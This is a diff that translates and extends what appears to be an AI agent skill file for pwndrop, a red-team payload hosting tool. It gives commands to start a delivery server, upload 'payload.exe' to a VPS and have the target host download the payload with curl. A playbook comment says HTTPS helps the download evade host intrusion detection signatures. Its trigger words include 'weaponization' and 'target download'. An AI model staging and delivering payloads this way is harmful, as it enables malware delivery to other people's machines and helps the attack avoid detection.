@@ -2,38 +2,39 @@
 name: pwndrop-file-drop
 description: "pwndrop: Hosts red-team payloads. Signals: payload development, weaponization, start delivery service, upload, target download."
 zh-signals: "pwndrop: 红队载荷托管。信号:载荷开发,武器化,启动投递服务,上传,目标机下载。"
+when-to-use: "Use when hosting red-team payloads for target download over HTTPS without relying on a temporary python http.server. Requires a reachable server or VPS and the payload files to upload."
 ---
 
 # pwndrop
 
-- 攻击大类:C07 载荷与文件投递
-- 上游仓库:https://github.com/kgretzky/pwndrop
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C07 Payload and File Delivery
+- Upstream Repository: https://github.com/kgretzky/pwndrop
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/kgretzky/pwndrop && cd pwndrop && make
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./pwndrop -s 0.0.0.0:443 -d files/` | 启动投递服务 |
-| `curl -F 'file=@payload.exe' https://vps:443/upload` | 上传 |
-| `curl -L -o file 'https://vps:443/shared/file'` | 目标机下载 |
-| `--no-web` | 纯 CLI |
+| `./pwndrop -s 0.0.0.0:443 -d files/` | Start the delivery service |
+| `curl -F 'file=@payload.exe' https://vps:443/upload` | Upload |
+| `curl -L -o file 'https://vps:443/shared/file'` | Download on the target host |
+| `--no-web` | CLI only |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 红队载荷托管
+### Red-team payload hosting
 
 ```bash
 ./pwndrop -s 0.0.0.0:443
-# 目标机 curl/Invoke-WebRequest 拉载荷,HTTPS 防 HIDS 特征
+# Target pulls the payload with curl/Invoke-WebRequest; HTTPS reduces HIDS signatures
 ```
 
-## 注意事项
+## Notes
 
-kgretzky 出品的自托管文件投递服务,Web 管理+短链+HTTPS,替代临时 python http.server。
+Self-hosted file delivery service by kgretzky, with web management, short links and HTTPS, replacing a temporary python http.server.
